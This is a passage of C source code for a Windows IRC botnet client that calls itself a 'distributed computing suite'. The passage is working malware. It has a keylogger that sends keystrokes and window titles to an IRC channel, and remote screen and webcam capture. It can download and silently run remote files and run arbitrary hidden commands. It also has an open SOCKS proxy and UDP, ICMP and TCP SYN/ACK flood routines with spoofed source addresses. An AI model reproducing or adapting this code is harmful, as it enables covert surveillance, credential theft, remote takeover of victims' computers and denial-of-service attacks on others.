					wsprintf(buffer, "PRIVMSG %s :Spoofing currently set to '%s'.\r\n", channel, spoof);
					send(sock, buffer, lstrlen(buffer), 0);
					return 0;
				}
				else 
				{
					SOCKADDR sa;
					int sas;
					char ip[32];

					sas = sizeof(sa);
					memset(&sa, 0, sizeof(sa));
					getsockname(sock, &sa, &sas);
					sprintf(ip, "%d.%d.%d.*", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4]);
					wsprintf(buffer, "PRIVMSG %s :Spoofing currently set to '%s'.\r\n", channel, ip);
					send(sock, buffer, lstrlen(buffer), 0);
					return 0;
				}
			}
			if (inet_addr(arg[5]) == INADDR_NONE)
			{
				wsprintf(buffer, "PRIVMSG %s :'%s' is an invalid IP address (it's not hard).\r\n", channel, arg[5]);
				send(sock, buffer, lstrlen(buffer), 0);
				return 0;
			}
			strcpy(spoof, arg[5]);
			spoofing = TRUE;
			wsprintf(buffer, "PRIVMSG %s :Spoof IP set to '%s'.\r\n", channel, arg[5]);
			send(sock, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[4],"keyspy") == 0)
		{
			if (lstrcmp(arg[5],"enable") == 0)
			{
				if (lstrlen(arg[6]) == 0) return 0;
				if (keylogging) 
				{
					wsprintf(buffer, "PRIVMSG %s :KeySpy already enabled.\r\n", channel);
					send(sock, buffer, lstrlen(buffer), 0);
					return 0;
				}
				KeyClr = atoi(arg[6]);
				keyhook = SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,GetModuleHandle(NULL),0);
				wsprintf(buffer, "PRIVMSG %s :KeySpy enabled.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
				keylogging = TRUE;
			}
			if (lstrcmp(arg[5],"disable") == 0)
			{
				UnhookWindowsHookEx(keyhook);
				wsprintf(buffer, "PRIVMSG %s :KeySpy disabled.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
				keylogging = FALSE;
			}
		}
		if (lstrcmp(arg[4],"capture") == 0)
		{
			if (lstrcmp(arg[5],"screen") == 0)
			{
				if (lstrlen(arg[6]) == 0) return 0;
				if (Capture(arg[6]) == TRUE)
				{
					wsprintf(buffer, "PRIVMSG %s :Screen capture saved to %s.\r\n", channel, arg[6]);
					send(sock, buffer, lstrlen(buffer), 0);
				}
				else
				{
					wsprintf(buffer, "PRIVMSG %s :Error while capturing screen.\r\n", channel);
					send(sock, buffer, lstrlen(buffer), 0);
				}
			}
			if (lstrcmp(arg[5],"drivers") == 0)
			{
				char svName[256];
				char svComment[512];

				for (int i=0;i<10;i++) {
					if(capGetDriverDescription(i, svName, 255, svComment, 511)) {
						wsprintf(buffer, "PRIVMSG %s :Capture driver #%d - %s - %s.\r\n", channel, i, svName, svComment);
						send(sock, buffer, lstrlen(buffer), 0);
					}
				}
			}
			if (lstrcmp(arg[5],"frame") == 0)
			{
				if (lstrlen(arg[9]) == 0) return 0;
				if (CaptureFrame(arg[6], atoi(arg[7]), atoi(arg[8]), atoi(arg[9])) == 0)
				{
					wsprintf(buffer, "PRIVMSG %s :Webcam capture saved to %s.\r\n", channel, arg[6]);
					send(sock, buffer, lstrlen(buffer), 0);
				}
				else
				{
					wsprintf(buffer, "PRIVMSG %s :Error while capturing from webcam.\r\n", channel, arg[6]);
					send(sock, buffer, lstrlen(buffer), 0);
				}
			}
			if (lstrcmp(arg[5],"video") == 0)
			{
				if (lstrlen(arg[10]) == 0) return 0;
				if (CaptureVideo(arg[6], atoi(arg[7]), atoi(arg[8]), atoi(arg[9]), atoi(arg[10])) == 0)
				{
					wsprintf(buffer, "PRIVMSG %s :Amateur video saved to %s.\r\n", channel, arg[6]);
					send(sock, buffer, lstrlen(buffer), 0);
				}
				else
				{
					wsprintf(buffer, "PRIVMSG %s :Error while capturing amateur video from webcam.\r\n", channel, arg[6]);
					send(sock, buffer, lstrlen(buffer), 0);
				}
			}
		}
		if (lstrcmp(arg[4],"download") == 0)
		{
			wsprintf(buffer, "PRIVMSG %s :Downloading %s to %s...\r\n", channel, arg[5], arg[6]);
			send(sock, buffer, lstrlen(buffer), 0);
			if (URLDownloadToFile(NULL, arg[5], arg[6], 0, NULL) == S_OK)
			{
				wsprintf(buffer, "PRIVMSG %s :File downloaded.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
			else
			{
				wsprintf(buffer, "PRIVMSG %s :Error while downloading file.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
			if (lstrcmp(arg[7],"1") == 0)
			{
				if (ShellExecute(GetDesktopWindow(),"open",arg[6],NULL,NULL,SW_HIDE) >= (HANDLE)32)
				{
					wsprintf(buffer, "PRIVMSG %s :File executed.\r\n", channel);
					send(sock, buffer, lstrlen(buffer), 0);
				}
				else
				{
					wsprintf(buffer, "PRIVMSG %s :Error while executing file.\r\n", channel);
					send(sock, buffer, lstrlen(buffer), 0);
				}
			}
		}
		if (lstrcmp(arg[4],"sysinfo") == 0)
		{
			SOCKADDR sa;
			int sas;
			MEMORYSTATUS memstat;
			OSVERSIONINFO verinfo;
			DWORD total, days, hours, minutes;
			SYSTEM_INFO CpuInfo;

			GlobalMemoryStatus(&memstat);
			GetSystemInfo(&CpuInfo);
			verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
			GetVersionEx(&verinfo);
			char *os;
			char os2[140];
			if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
				if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
			}
			else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
			else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
			else os = "???";
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
				sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
				os = os2;
			}
			sas = sizeof(sa);
			memset(&sa, 0, sizeof(sa));
			getsockname(sock, &sa, &sas);
			total = (GetTickCount() / 1000);
			days = total / 86400;
			hours = (total % 86400) / 3600;
			minutes = ((total % 86400) % 3600) / 60;
			wsprintf(buffer, "PRIVMSG %s :OS: Windows %s. IP: %d.%d.%d.%d. Memory: %d/%dMB. CPU: %dMHz with %d processor(s). Uptime: %d day(s), %d hour(s), and %d minute(s).\r\n", channel, os, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], ((memstat.dwAvailPhys / 1024) / 1024), ((memstat.dwTotalPhys / 1024) / 1024), cpuspeed(), CpuInfo.dwNumberOfProcessors, days, hours, minutes);
			send(sock, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[4],"uptime") == 0)
		{
			DWORD total, days, hours, minutes;
			total = (GetTickCount() / 1000);
			days = total / 86400;
			hours = (total % 86400) / 3600;
			minutes = ((total % 86400) % 3600) / 60;
			wsprintf(buffer, "PRIVMSG %s :System Uptime: %d day(s), %d hour(s), and %d minute(s).\r\n", channel, days, hours, minutes);
			send(sock, buffer, lstrlen(buffer), 0);
			total = (GetTickCount() / 1000) - (uptime / 1000);
			days = total / 86400;
			hours = (total % 86400) / 3600;
			minutes = ((total % 86400) % 3600) / 60;
			wsprintf(buffer, "PRIVMSG %s :Connected to IRC for: %d day(s), %d hour(s), and %d minute(s).\r\n", channel, days, hours, minutes);
			send(sock, buffer, lstrlen(buffer), 0);
		}
		if (lstrcmp(arg[4],"exec") == 0)
		{
			char cmdline[4096];

			if (lstrlen(arg[5]) == 0) return 0;
			ZeroMemory(cmdline, sizeof(cmdline));
			strcpy(cmdline,"");
			for (i=5; i<32; i++)
			{
				if (lstrlen(arg[i]) > 0)
				{
					if (i == 5) strcpy(cmdline, arg[i]);
					else 
					{
						strcat(cmdline," ");
						strcat(cmdline,arg[i]);
					}
				}
			}
			if (ShellExecute(0, "open", arg[5], cmdline, NULL, SW_HIDE) > (HINSTANCE)32)
			{
				wsprintf(buffer, "PRIVMSG %s :File executed.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
			else
			{
				wsprintf(buffer, "PRIVMSG %s :Error while executing file.\r\n", channel);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
		if (lstrcmp(arg[4],"send") == 0)
		{
			DCCSEND dcc;
			DWORD thread;

			if (lstrlen(arg[7]) == 0) return 0;
			if (GetFileAttributes(arg[6]) == 0xFFFFFFFF)
			{
				wsprintf(buffer, "PRIVMSG %s :File not found.\r\n", channel, arg[5]);
				send(sock, buffer, lstrlen(buffer), 0);
				return 0;
			}
			strcpy(dcc.target, arg[5]);
			strncpy(dcc.file, arg[6], MAX_PATH-2);
			strncpy(dcc.sfile, arg[7], MAX_PATH-2);
			CreateThread(NULL, 0, &DccSend, (void *)&dcc, 0, &thread);
		}
		if (lstrcmp(arg[4],"active") == 0)
		{
			char WndTxt[1024];

			if (GetWindowText(GetForegroundWindow(), WndTxt, sizeof(WndTxt)) > 0)
			{
				wsprintf(buffer, "PRIVMSG %s :Active window: %s.\r\n", channel, WndTxt);
				send(sock, buffer, lstrlen(buffer), 0);
			}
		}
		if (lstrcmp(arg[4],"udp") == 0)
		{
			UDPFLOOD info;
			DWORD thread;

			if (lstrlen(arg[7]) == 0) return 0;
			strncpy(info.target,arg[5],255);
			info.port = atoi(arg[6]);
			info.time = atoi(arg[7]);
			CreateThread(NULL, 0, &UDP, (void *)&info, 0, &thread);
		}
		if (lstrcmp(arg[4],"icmp") == 0)
		{
			ICMPFLOOD info;
			DWORD thread;

			if (lstrlen(arg[6]) == 0) return 0;
			strncpy(info.target,arg[5],255);
			info.time = atoi(arg[6]);
			CreateThread(NULL, 0, &ICMP, (void *)&info, 0, &thread);
		}
		if (lstrcmp(arg[4],"syn") == 0 || lstrcmp(arg[4],"ack") == 0 || lstrcmp(arg[4],"random") == 0)
		{
			TCPFLOOD info;
			DWORD thread;

			if (lstrlen(arg[7]) == 0) return 0;
			strncpy(info.target,arg[5],255);
			strncpy(info.type,arg[4],32);
			info.port = atoi(arg[6]);
			info.time = atoi(arg[7]);
			CreateThread(NULL, 0, &TCP, (void *)&info, 0, &thread);
		}
		if (lstrcmp(arg[4],"version") == 0)
		{
			wsprintf(buffer, "PRIVMSG %s :Wisdom distributed computing suite. Version %d.%d (%s).\r\n", channel, major, minor, verinfo);
			send(sock, buffer, lstrlen(buffer), 0);
		}
	}
	return 0;
}

char * rndnick(char *strbuf)
{
	int n, nl;
	char nick[12];

	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	nl = (rand()%3)+6;
	for (n=0; n<nl; n++) nick[n] = (rand()%26)+97;
	nick[n+1] = '\0';
	strncpy(strbuf, nick, 12);
	return strbuf;
}

USHORT checksum(USHORT *buffer, int size) 
{ 
	unsigned long cksum=0; 
	while(size >1) 
	{ 
		cksum+=*buffer++; 
		size -=sizeof(USHORT); 
	} 
	if(size ) 
	{ 
		cksum += *(UCHAR*)buffer; 
	} 
	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16); 
	return (USHORT)(~cksum); 
}

int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;
	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000);
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;
	return speed;
 }

unsigned __int64 cyclecount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}

LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam)
{
	char buffer[512];

	if(code<0) return CallNextHookEx(keyhook,code,wParam,lParam);
	if(code==HC_ACTION) {
		EVENTMSG *pEvt=(EVENTMSG *)lParam;
		if(pEvt->message==WM_KEYDOWN) {
			DWORD dwCount,dwBytes;
			char svBuffer[256];
			int vKey,nScan;
		
			vKey=LOBYTE(pEvt->paramL);
			nScan=HIBYTE(pEvt->paramL);
			nScan<<=16;
			HWND hFocus=GetActiveWindow();
			if(hLastFocus!=hFocus) {
				char svTitle[256];
				int nCount;
				nCount=GetWindowText(hFocus,svTitle,256);
				if(nCount>0) {
					if (lstrlen(svTitle) > 32)
					{
						svTitle[32]=0;
						strcat(svTitle, "...");
					}
					char svBuffer[512];
					wsprintf(svBuffer,"(%s) ",svTitle);
					strcat(KeyBuffer, svBuffer);
					if(lstrlen(KeyBuffer)>150)
					{
						wsprintf(buffer, "PRIVMSG %s :\3%d(KeySpy) %s\r\n",channel,KeyClr,KeyBuffer);
						send(sock, buffer, lstrlen(buffer), 0);
						strcpy(KeyBuffer, "");
					}
				}
				hLastFocus=hFocus;
			}
			dwCount=GetKeyNameText(nScan,svBuffer,256);	
			if(dwCount) {
				if(vKey==VK_SPACE) {
					svBuffer[0]=' ';
					svBuffer[1]='\0';
					dwCount=1;
				}
				if(dwCount==1) {
					BYTE kbuf[256];
					WORD ch;
					int chcount;
					
					GetKeyboardState(kbuf);					
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					if(chcount>0) 
					{
						if (ch < 32) return 0;
						strncat(KeyBuffer,(char *)&ch,1);		
					}
					if(lstrlen(KeyBuffer)>150)
					{
						wsprintf(buffer, "PRIVMSG %s :\3%d(KeySpy) %s\r\n",channel,KeyClr,KeyBuffer);
						send(sock, buffer, lstrlen(buffer), 0);
						strcpy(KeyBuffer, "");
					}
				} else {
					//seing tons of [Backspace] and shit got annoying, so only process a few important keys..

					//strcat(KeyBuffer,"[");
					//strcat(KeyBuffer,svBuffer);
					if (lstrcmp(svBuffer,"Backspace") == 0)
					{
						KeyBuffer[lstrlen(KeyBuffer)-1] = 0;
					}
					if (lstrcmp(svBuffer,"Enter") == 0)
					{
						wsprintf(buffer, "PRIVMSG %s :\3%d(KeySpy) %s\r\n",channel,KeyClr,KeyBuffer);
						send(sock, buffer, lstrlen(buffer), 0);
						strcpy(KeyBuffer,"");
					}
					//strcat(KeyBuffer,"]");
					//if(lstrlen(KeyBuffer)>150)
					//{
					//	wsprintf(buffer, "PRIVMSG %s :(KeySpy) %s\r\n",channel,KeyBuffer);
					//	send(sock, buffer, lstrlen(buffer), 0);
					//	strcpy(KeyBuffer, "");
					//}
				}
			}			
		}
	
	}
	return CallNextHookEx(keyhook,code,wParam,lParam);
}

DWORD WINAPI UDP(LPVOID param)
{
	UDPFLOOD info;
	static UDPPACKET packet;
	struct sockaddr_in udp_sin;
	SOCKET udpsock;
	BOOL flag;
	int ret;
	int sent;
	unsigned long start;
	char ip[32];
	SOCKADDR sa;
	int sas;
	char buffer[1024];

	info = *((UDPFLOOD *)param);
	if (info.time == 0)
	{
		wsprintf(buffer, "PRIVMSG %s :You cant send packets for 0 seconds.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	udpsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (udpsock == INVALID_SOCKET)
	{
		wsprintf(buffer, "PRIVMSG %s :Error calling socket().\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	flag = TRUE; 
	if (setsockopt(udpsock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) 
	{
		wsprintf(buffer, "PRIVMSG %s :Error calling setsockopt(). WSAGetLastError() returns %d.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	if (inet_addr(info.target) == INADDR_NONE)
	{
		wsprintf(buffer, "PRIVMSG %s :Invalid target IP.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	udp_sin.sin_family = AF_INET;
	udp_sin.sin_port = htons(0);
	udp_sin.sin_addr.s_addr = inet_addr(info.target);
	start = GetTickCount();
	wsprintf(buffer, "PRIVMSG %s :Sending packets to %s...\r\n", channel, info.target);
	send(sock, buffer, lstrlen(buffer), 0);
	sent = 0;
	while (((GetTickCount() - start) / 1000) <= (unsigned long)info.time)
	{
		if (!spoofing) 
		{
			sas = sizeof(sa);
			memset(&sa, 0, sizeof(sa));
			getsockname(sock, &sa, &sas);
			sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], rand()%255);
		}
		else
		{
			strcpy(ip, spoof);
		}
		packet.ipHeader.h_verlen=(4<<4 | sizeof(IPHEADER)/sizeof(unsigned long)); 
		packet.ipHeader.total_len=htons(sizeof(ECHOREQUEST)); 
		packet.ipHeader.ident=1; 
		packet.ipHeader.frag_and_flags=0; 
		packet.ipHeader.ttl=128; 
		packet.ipHeader.proto=IPPROTO_UDP; 
		packet.ipHeader.checksum=0; 
		packet.ipHeader.sourceIP=inet_addr(ip); 
		packet.ipHeader.destIP=udp_sin.sin_addr.s_addr;
		packet.udpHeader.Checksum = 0;
		if (info.port == 0) packet.udpHeader.dport = htons(rand()%1025);
		else packet.udpHeader.dport = htons(info.port);
		packet.udpHeader.sport = rand()%1025;
		packet.udpHeader.Length = htons(sizeof(UDPHDR)+REQ_DATASIZE);
		//fill the packet data with a random character..
		memset(packet.cData, rand()%255, REQ_DATASIZE);
		if (sendto(udpsock, (const char *) &packet, sizeof(packet), 0, (SOCKADDR *)&udp_sin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			wsprintf(buffer, "PRIVMSG %s :Error sending packets to %s. eax=SOCKET_ERROR, WSAGetLastError()=%d. sizeof(buffer) = %d. Packets sent sucessfully = %d.\r\n", channel, info.target, WSAGetLastError(), sizeof(packet), sent);
			send(sock, buffer, lstrlen(buffer), 0);
			return 0;
		}
		sent = sent + 1;
	}
	closesocket(udpsock);
	wsprintf(buffer, "PRIVMSG %s :Finished sending packets to %s. Sent %d packet(s). ~%dMB of data sent (~%dK/s).\r\n", channel, info.target, sent, (((sent * sizeof(packet)) / 1024) / 1024), (((sent * sizeof(packet)) / 1024) / info.time));
	send(sock, buffer, lstrlen(buffer), 0);
	return 0;
}

DWORD WINAPI SocksDaemon(LPVOID param)
{
	struct sockaddr_in info;
	struct sockaddr_in client_in;
	SOCKET server;
	SOCKET client;
	DWORD lpThreadId;

	info.sin_family = AF_INET;
	info.sin_port = htons(559);
	info.sin_addr.s_addr = INADDR_ANY;
	server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (bind(server, (SOCKADDR *)&info, sizeof(info)) != 0)
	{
		return 0;
	}
	if (listen(server, 10) != 0)
	{
		return 0;
	}
	while (TRUE)
	{
		client = accept(server, (SOCKADDR *)&client_in, NULL);
		CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)client, 0, &lpThreadId);
	}
	return 0;
}

DWORD WINAPI Socks4ClientThread(LPVOID pParam)
{
	struct SOCKS4HEADER hdr;
	SOCKET client=(SOCKET)pParam;
	timeval timeout;
	fd_set fd;
	SOCKADDR_IN target_in;
	SOCKET outbound;

	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(client, &fd);
	if (select(0, &fd, NULL, NULL, &timeout) == 0)
	{
		closesocket(client);
		return 0;
	}
	if (recv(client, (char *)&hdr, sizeof(hdr), 0) <= 0)
	{
		closesocket(client);
		return 0;
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) 
	{
		closesocket(client);
		return 0;
	}
	memset(&target_in, 0, sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		send(client, (char *)&hdr, 8, 0);
		closesocket(client);
		return 0;
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, 1024);
	send(client, (char *)&hdr, 8, 0);
	transfer_loop(outbound, client);
	return 0;
}

void transfer_loop(SOCKET target, SOCKET client)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE)
	{
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);

		memset(buf, 0, sizeof(buf));
		select(0, &fd, NULL, NULL, NULL);

		if(FD_ISSET(client, &fd))
		{
			if((len = recv(client,buf,sizeof(buf),0))== -1) break;
			if(send(target,buf,len,0)== -1) break;
		}
	    if (FD_ISSET(target,&fd))
		{
			if((len = recv(target,buf,sizeof(buf),0))== -1) break;
			if(send(client,buf,len,0)== -1) break;
		}
	}
}

DWORD WINAPI ICMP(LPVOID param)
{
	ICMPFLOOD info;
	static ECHOREQUEST echo_req;
	struct sockaddr_in icmp_sin;
	SOCKET icmpsock;
	BOOL flag;
	int ret;
	int sent;
	unsigned long start;
	char ip[32];
	SOCKADDR sa;
	int sas;
	char buffer[1024];

	info = *((ICMPFLOOD *)param);
	icmpsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (icmpsock == INVALID_SOCKET)
	{
		wsprintf(buffer, "PRIVMSG %s :Error calling socket().\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	flag = TRUE; 
	if (setsockopt(icmpsock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) 
	{
		wsprintf(buffer, "PRIVMSG %s :Error calling setsockopt(). WSAGetLastError() returns %d.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	if (inet_addr(info.target) == INADDR_NONE)
	{
		wsprintf(buffer, "PRIVMSG %s :Invalid target IP.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	icmp_sin.sin_family = AF_INET;
	icmp_sin.sin_port = htons(0);
	icmp_sin.sin_addr.s_addr = inet_addr(info.target);
	start = GetTickCount();
	wsprintf(buffer, "PRIVMSG %s :Sending packets to %s...\r\n", channel, info.target);
	send(sock, buffer, lstrlen(buffer), 0);
	sent = 0;
	while (((GetTickCount() - start) / 1000) <= (unsigned long)info.time)
	{
		if (!spoofing) 
		{
			sas = sizeof(sa);
			memset(&sa, 0, sizeof(sa));
			getsockname(sock, &sa, &sas);
			sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], rand()%255);
		}
		else
		{
			strncpy(ip, spoof, 32);
		}
		echo_req.ipHeader.h_verlen=(4<<4 | sizeof(IPHEADER)/sizeof(unsigned long)); 
		echo_req.ipHeader.total_len=htons(sizeof(ECHOREQUEST)); 
		echo_req.ipHeader.ident=1; 
		echo_req.ipHeader.frag_and_flags=0; 
		echo_req.ipHeader.ttl=128; 
		echo_req.ipHeader.proto=IPPROTO_ICMP; 
		echo_req.ipHeader.checksum=0; 
		echo_req.ipHeader.sourceIP=inet_addr(ip); 
		echo_req.ipHeader.destIP=icmp_sin.sin_addr.s_addr;
		echo_req.icmpHdr.icmp_type = rand()%256;
		echo_req.icmpHdr.icmp_code = rand()%256;
		echo_req.icmpHdr.icmp_id = (rand() % 240) + 1;
		echo_req.icmpHdr.icmp_cksum = 0;
		echo_req.icmpHdr.icmp_seq = 1;
		//fill the packet data with a random character..
		memset(echo_req.cData, rand()%255, REQ_DATASIZE);
		if (sendto(icmpsock, (const char *) &echo_req, sizeof(ECHOREQUEST), 0, (SOCKADDR *)&icmp_sin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			wsprintf(buffer, "PRIVMSG %s :Error sending packets to %s. eax=SOCKET_ERROR, WSAGetLastError()=%d. sizeof(buffer) = %d. Packets sent sucessfully = %d.\r\n", channel, info.target, WSAGetLastError(), sizeof(echo_req), sent);
			send(sock, buffer, lstrlen(buffer), 0);
			return 0;
		}
		sent = sent + 1;
	}
	closesocket(icmpsock);
	wsprintf(buffer, "PRIVMSG %s :Finished sending packets to %s. Sent %d packet(s). ~%dMB of data sent (~%dK/s).\r\n", channel, info.target, sent, (((sent * sizeof(echo_req)) / 1024) / 1024), (((sent * sizeof(echo_req)) / 1024) / info.time));
	send(sock, buffer, lstrlen(buffer), 0);
	return 0;
}

DWORD WINAPI TCP(LPVOID param)
{
	TCPFLOOD info;
	IPHEADER ipHeader; 
	TCPHEADER tcpHeader; 
	PSDHEADER psdHeader; 
	char szSendBuf[60]={0}; 
	BOOL flag; 
	SOCKET ssock; 
	SOCKADDR_IN addr_in; 
	int ret;
	SOCKADDR sa;
	int sas;
	char ip[32];
	unsigned long start;
	int sent;
	char buffer[1024];

	srand(GetTickCount());
	info = *((TCPFLOOD *)param);
	if (info.time == 0)
	{
		wsprintf(buffer, "PRIVMSG %s :You cant send packets for 0 seconds.\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	ssock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	if (ssock==INVALID_SOCKET) 
	{
		wsprintf(buffer, "PRIVMSG %s :Error calling socket().\r\n", channel);
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	} 
	flag = TRUE; 
	if (setsockopt(ssock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
	{ 
		wsprintf(buffer, "PRIVMSG %s :Error calling setsockopt(). WSAGetLastError() returns %d.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	} 
	if (inet_addr(info.target) == INADDR_NONE)
	{
		wsprintf(buffer, "PRIVMSG %s :Invalid target IP.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	addr_in.sin_family=AF_INET; 
	addr_in.sin_port=htons(0); 
	addr_in.sin_addr.s_addr=inet_addr(info.target); 
	start = GetTickCount();
	wsprintf(buffer, "PRIVMSG %s :Sending packets to %s...\r\n", channel, info.target);
	send(sock, buffer, lstrlen(buffer), 0);
	sent = 0;
	while (((GetTickCount() - start) / 1000) <= (unsigned long)info.time)
	{
		if (!spoofing) 
		{
			sas = sizeof(sa);
			memset(&sa, 0, sizeof(sa));
			getsockname(sock, &sa, &sas);
			sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], rand()%255);
		}
		else
		{
			strcpy(ip, spoof);
		}
		ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
		ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
		ipHeader.ident=1; 
		ipHeader.frag_and_flags=0; 
		ipHeader.ttl=128; 
		ipHeader.proto=IPPROTO_TCP; 
		ipHeader.checksum=0; 
		ipHeader.sourceIP=inet_addr(ip); 
		ipHeader.destIP=addr_in.sin_addr.s_addr; 
		if (info.port == 0) tcpHeader.th_dport=htons(rand()%1025);
		else tcpHeader.th_dport=htons(info.port); 
		tcpHeader.th_sport=htons(rand()%1025);  
		tcpHeader.th_seq=htonl(0x12345678); 
		if (lstrcmp(info.type,"syn") == 0) 
		{
			tcpHeader.th_ack=0;
			tcpHeader.th_flag=SYN;
		}
		if (lstrcmp(info.type,"ack") == 0)
		{
			tcpHeader.th_ack=0;
			tcpHeader.th_flag=ACK;
		}
		if (lstrcmp(info.type,"random") == 0)
		{
			tcpHeader.th_ack=rand()%3;
			if (rand()%2 == 0) tcpHeader.th_flag=SYN;
			else tcpHeader.th_flag=ACK;
		}
		tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
		tcpHeader.th_win=htons(512); 
		tcpHeader.th_urp=0; 
		tcpHeader.th_sum=0; 
		psdHeader.saddr=ipHeader.sourceIP; 
		psdHeader.daddr=ipHeader.destIP; 
		psdHeader.mbz=0; 
		psdHeader.ptcl=IPPROTO_TCP; 
		psdHeader.tcpl=htons(sizeof(tcpHeader)); 
		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
		tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		ret=sendto(ssock, (char *)&szSendBuf, sizeof(szSendBuf), 0, (SOCKADDR *)&addr_in, sizeof(addr_in)); 
		if (ret==SOCKET_ERROR) 
		{
			wsprintf(buffer, "PRIVMSG %s :Error sending packets to %s. eax=SOCKET_ERROR, WSAGetLastError()=%d. sizeof(buffer) = %d. Packets sent sucessfully = %d.\r\n", channel, info.target, WSAGetLastError(), sizeof(szSendBuf), sent);
			send(sock, buffer, lstrlen(buffer), 0);
			return 0;
		}
		sent = sent + 1;
	}
	closesocket(ssock);
	wsprintf(buffer, "PRIVMSG %s :Finished sending packets to %s. Sent %d packet(s). ~%dMB of data sent (~%dK/s).\r\n", channel, info.target, sent, (((sent * sizeof(szSendBuf)) / 1024) / 1024), (((sent * sizeof(szSendBuf)) / 1024) / info.time));
	send(sock, buffer, lstrlen(buffer), 0);
